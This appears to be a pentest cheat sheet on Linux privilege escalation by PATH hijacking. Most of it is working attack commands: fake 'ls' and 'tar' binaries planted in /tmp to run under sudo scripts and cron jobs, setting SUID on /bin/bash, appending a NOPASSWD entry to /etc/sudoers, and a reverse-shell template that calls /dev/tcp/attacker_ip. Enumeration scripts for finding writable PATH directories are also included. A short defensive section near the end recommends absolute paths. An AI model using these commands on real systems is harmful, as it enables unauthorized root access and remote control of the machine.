# 🛤️ PATH Abuse

## 🎯 Overview

PATH environment variable manipulation to achieve privilege escalation by hijacking command execution through directory precedence and writable path exploitation.

## 📍 PATH Variable Basics

### Understanding PATH
```bash
# Check current PATH
echo $PATH
env | grep PATH

# Typical PATH structure
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

**How PATH Works:**
- System searches directories **left to right**
- **First match** gets executed
- **Absolute paths** bypass PATH lookup
- **Relative commands** use PATH resolution

## 🎯 PATH Hijacking Attack Vectors

### Current Directory Injection
```bash
# Add current directory to PATH (dangerous!)
PATH=.:$PATH
export PATH

# Create malicious script
echo 'echo "PATH HIJACKED!"' > ls
chmod +x ls

# Execute - runs our script instead of /bin/ls
ls
```
sudo =
### Writable Directory Exploitation
```bash
# Find writable directories in PATH
echo $PATH | tr ':' '\n' | xargs ls -ld 2>/dev/null | grep "^d.w"

# Check for writable dirs
for dir in $(echo $PATH | tr ':' '\n'); do
    if [ -w "$dir" ]; then
        echo "Writable: $dir"
    fi
done
```

## 🔧 Common Attack Scenarios

### Scenario 1: Sudo Script with Relative Commands
```bash
# Check sudo permissions
sudo -l

# Example vulnerable sudo entry:
# (root) NOPASSWD: /home/user/script.sh

# If script.sh contains relative commands:
cat /home/user/script.sh
# #!/bin/bash
# ls /tmp        # Vulnerable - uses relative 'ls'
# ps aux         # Vulnerable - uses relative 'ps'
```

**Exploitation:**
```bash
# Create malicious binaries
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls

# Modify PATH to prioritize /tmp
export PATH=/tmp:$PATH

# Execute vulnerable sudo script
sudo /home/user/script.sh  # Triggers our malicious 'ls'
```

### Scenario 2: Cronjob Path Manipulation
```bash
# Check cron jobs for relative commands
cat /etc/crontab
ls -la /etc/cron.d/

# Look for scripts using relative paths
grep -r "#!/bin/sh" /etc/cron.d/ | xargs cat
```

**If cron job runs:**
```bash
*/5 * * * * root /script.sh
```

**And script.sh contains:**
```bash
#!/bin/sh
cp /important/file /backup/  # Vulnerable if PATH is manipulated
```

## 🎭 Script and Binary Hijacking

### Common Target Commands
```bash
# Most frequently hijacked commands
ls, ps, id, whoami, cat, cp, mv, rm, chmod, chown
```

### Malicious Script Templates
```bash
# Simple privilege escalation
#!/bin/bash
/bin/bash

# Reverse shell
#!/bin/bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Add user to sudoers
#!/bin/bash
echo "hacker ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Copy /bin/bash to writable location with SUID
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

## 🔍 Enumeration Techniques

### PATH Analysis
```bash
# Current user PATH
echo $PATH

# Other users' PATH (from environment)
cat /home/*/.bashrc | grep PATH
cat /home/*/.profile | grep PATH

# System-wide PATH settings
cat /etc/environment
cat /etc/profile
```

### Writable Directory Detection
```bash
# Check PATH directories for write permissions
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -w "$dir" 2>/dev/null ]; then
        echo "WRITABLE: $dir"
    fi
done

# Alternative one-liner
echo $PATH | tr ':' '\n' | xargs -I {} sh -c 'test -w "{}" && echo "Writable: {}"'
```

### Vulnerable Script Detection
```bash
# Find scripts using relative commands
grep -r "^[^/]" /etc/cron.d/ 2>/dev/null
grep -r "^[^/]" /opt/scripts/ 2>/dev/null

# Check sudo scripts for relative paths
sudo -l | grep -E "\(/.*\.sh\)" | while read script; do
    if [ -r "$script" ]; then
        echo "=== $script ==="
        grep -E "^[a-zA-Z]" "$script" | head -5
    fi
done
```

## 🚀 Exploitation Examples

### Basic PATH Hijacking
```bash
# 1. Identify vulnerable script
sudo -l
# Output: (root) NOPASSWD: /usr/local/bin/backup.sh

# 2. Analyze script
cat /usr/local/bin/backup.sh
# Contains: tar czf backup.tar.gz *

# 3. Create malicious tar
echo '#!/bin/bash' > /tmp/tar
echo 'chmod u+s /bin/bash' >> /tmp/tar
chmod +x /tmp/tar

# 4. Modify PATH
export PATH=/tmp:$PATH

# 5. Execute vulnerable script
sudo /usr/local/bin/backup.sh

# 6. Verify SUID bash
ls -la /bin/bash
/bin/bash -p  # Gain root shell
```

### Cronjob PATH Exploitation
```bash
# If cron runs script with relative commands
# Create malicious binary in writable PATH directory
echo '#!/bin/bash' > /usr/local/bin/vulnerable_cmd
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /usr/local/bin/vulnerable_cmd
chmod +x /usr/local/bin/vulnerable_cmd

# Wait for cron execution
# Then execute SUID bash
/tmp/rootbash -p
```

## 🔍 Detection & Enumeration

### Quick PATH Audit
```bash
#!/bin/bash
echo "=== PATH ABUSE ENUMERATION ==="

echo "[+] Current PATH:"
echo $PATH

echo "[+] Writable PATH directories:"
echo $PATH | tr ':' '\n' | while read dir; do
    if [ -w "$dir" 2>/dev/null ]; then
        echo "  WRITABLE: $dir"
    fi
done

echo "[+] Sudo scripts with potential relative commands:"
sudo -l 2>/dev/null | grep -E "NOPASSWD.*\.sh" | while read line; do
    script=$(echo $line | grep -oE "/.*\.sh")
    if [ -r "$script" ]; then
        echo "  Script: $script"
        grep -E "^[a-zA-Z]" "$script" 2>/dev/null | head -3 | sed 's/^/    /'
    fi
done

echo "[+] Cron jobs with relative commands:"
cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -E "[^/][a-zA-Z]"
```

## ⚠️ Defensive Considerations

### Secure PATH Practices
```bash
# Always use absolute paths in scripts
/bin/ls instead of ls
/usr/bin/id instead of id

# Secure PATH for scripts
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Remove current directory from PATH
export PATH=$(echo $PATH | sed 's/:\.:/:/g' | sed 's/^\.://' | sed 's/:\.$//')
```

### Common Vulnerabilities
- **Current directory (.) in PATH** - Most dangerous
- **Writable directories** in PATH - Exploitation opportunity
- **Scripts using relative commands** - Hijacking targets
- **User-modifiable PATH** - Attack vector

## 🔑 Key Attack Points

### High-Impact Scenarios
1. **Sudo scripts** with relative commands + writable PATH directory
2. **Cron jobs** executing scripts with relative paths  
3. **SUID binaries** calling other programs without absolute paths
4. **User scripts** with PATH manipulation capabilities

### Quick Wins
- Check `sudo -l` for scripts
- Look for writable directories in PATH
- Find scripts with relative command calls
- Test PATH modification permissions

---

*PATH abuse exploits the fundamental way Linux systems locate executables - by manipulating the search order, attackers can hijack command execution and escalate privileges through legitimate system mechanisms.* 